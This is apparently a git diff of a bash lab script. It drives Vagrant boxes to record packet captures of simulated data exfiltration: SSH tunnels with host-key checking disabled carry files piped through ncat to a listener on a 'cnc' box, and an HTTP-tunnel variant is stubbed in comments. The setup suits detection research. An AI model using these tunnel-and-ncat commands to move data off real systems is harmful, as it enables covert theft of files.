@@ -1,8 +1,16 @@
 #!/bin/bash
 
+# Global variables
+
 PCAP_DIR="/vagrant/pcap"
 SCRIPT_DIR="`pwd`/scripts"
 SLEEP_INTERVAL='1'
+
+# Tail this file to verify that data is being transfered
+# --output or stdout of cnc listener should be redirected here
+LOGFILE='/vagrant/test.log'
+
+SSH_ARGS='-o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no'
 
 MONITORING_BOX='tap'
 SENDER_BOX='host'
@@ -19,6 +27,8 @@ LISTENER_IP6='2a02:1010:12::12'
 
 TUN64_MODES=( 't6over4' 't6to4' 'isatap' )
 
+# Common functions
+
 die() { 
     echo "$@" 1>&2
     exit 1
@@ -27,24 +37,9 @@ die() {
 SSH () {
     BOX=$1
     CMD=$2
-    
-    vagrant ssh $BOX -c "$CMD"
-#    case $version in
-#        tap)
-#        IP='192.168.56.195'
-#        ;;
-#        cnc)
-#        IP='192.168.56.194'
-#        ;;
-#        host)
-#        IP='192.168.56.193'
-#        ;;
-#        *)
-#        die "No IP version argument"
-#        ;;
-#    esac
 
-    #ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -p 2022 root@$IP $CMD
+    vagrant ssh $BOX -c "$CMD"
+
 }
 
 start_tcpdump_listener () {
@@ -58,14 +53,13 @@ start_tcpdump_listener () {
 
     # Clean up any existing 
     kill_tcpdump_listener
-    echo "Creating PCAP folder"
 
+    echo "Creating PCAP folder"
     SSH $MONITORING_BOX "sudo mkdir -p $PCAP_DIR"
+
     echo "starting tcpdump for $PCAP_NAME.pcap in folder $PCAP_DIR"
     SSH $MONITORING_BOX "nohup sudo tcpdump -i $INTERFACE -w $PCAP_DIR/$PCAP_NAME.pcap & sleep 1"
 
-    echo "sleeping after sending data"
-    sleep $SLEEP_INTERVAL
 }
 
 kill_tcpdump_listener () {
@@ -74,6 +68,33 @@ kill_tcpdump_listener () {
     sleep $SLEEP_INTERVAL
 }
 
+send_files () {
+    LISTEN_CMD=$1
+    KILL_CMD=$3
+
+    for file in "${FILES[@]}"; do
+
+        SEND_CMD="sudo cat $file | $2"
+
+        echo "Starting listener"
+        echo "$LISTEN_CMD"
+        SSH $LISTENER_BOX "$LISTEN_CMD"
+        sleep $SLEEP_INTERVAL
+
+        echo "Sending data"
+        echo "$SEND_CMD"
+        SSH $SENDER_BOX "$SEND_CMD"
+        sleep $SLEEP_INTERVAL
+
+        echo "Attempting to kill listener"
+        echo "$KILL_CMD"
+        SSH $LISTENER_BOX "$KILL_CMD"
+        sleep $SLEEP_INTERVAL
+    done
+}
+
+# SSH tunneling
+
 iterate_ssh_tunnels () {
     for version in "${IP_VERSIONS[@]}"; do
         for port in "${PORTS[@]}"; do
@@ -81,13 +102,13 @@ iterate_ssh_tunnels () {
 
             case $version in
                 4)
-                ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no vagrant@$LISTENER_IP4 -L 4444:$LISTENER_IP4:4444 -N -f -p $port"
-                LISTEN_DATA="ncat -4 -l -p 4444 -k -w 5 --output /vagrant/test.log"
+                ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa $SSH_ARGS vagrant@$LISTENER_IP4 -L 4444:$LISTENER_IP4:4444 -N -f -p $port"
+                LISTEN_DATA="ncat -4 -l -p 4444 -k -w 5 --output $LOGFILE"
                 SEND_DATA="ncat 127.0.0.1 4444"
                 ;;
                 6)
-                ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -6 vagrant@$LISTENER_IP6 -L 6666:\[$LISTENER_IP6\]:6666 -N -f -p $port"
-                LISTEN_DATA="ncat -6 -l -p 6666 -k -w 5 --output /vagrant/test.log"
+                ESTABLISH="ssh -i /home/vagrant/.ssh/id_rsa $SSH_ARGS -6 vagrant@$LISTENER_IP6 -L 6666:\[$LISTENER_IP6\]:6666 -N -f -p $port"
+                LISTEN_DATA="ncat -6 -l -p 6666 -k -w 5 --output $LOGFILE"
                 SEND_DATA="ncat -6 ::1 6666"
                 ;;
                 *)
@@ -96,6 +117,10 @@ iterate_ssh_tunnels () {
             esac
 
             ITERATION_NAME="ssh-$version-$port"
+            LISTEN_CMD="nohup sudo $LISTEN_DATA & sleep 1"
+            SEND_CMD="sudo $SEND_DATA"
+            KILL_CMD="sudo pkill ncat"
+
             echo "$ITERATION_NAME"
         
             # Cleanup just in case
@@ -107,14 +132,8 @@ iterate_ssh_tunnels () {
         
             echo "Establishing SSH tunnel for iteration: $ITERATION_NAME"
             SSH $SENDER_BOX "sudo nohup $ESTABLISH" || die "Failed to establish ssh channel"
-            for file in "${FILES[@]}"; do
-                echo "Starting netcat listener"
-                SSH $LISTENER_BOX "nohup sudo $LISTEN_DATA & sleep 1"
-                sleep $SLEEP_INTERVAL
-                echo "Sending data"
-                SSH $SENDER_BOX "sudo cat $file | sudo $SEND_DATA"
-                sleep $SLEEP_INTERVAL
-            done
+
+            send_files "$LISTEN_CMD" "$SEND_CMD" "$KILL_CMD"
         
             echo "Cleaning up"
             SSH $LISTENER_BOX "sudo pkill ncat"
@@ -158,4 +177,17 @@ reconfigure_ssh_listener () {
 
 }
 
+# HTTP tunneling
+
+#iterate_http_tunnels {
+#    for port in "${PORTS[@]}"; do
+#        LISTEN_DATA="hts $port -s"
+#        SEND_DATA="htc -s LISTENER_IP4:$port"
+#
+#
+#
+#    done
+#}
+
+# MAIN
 iterate_ssh_tunnels
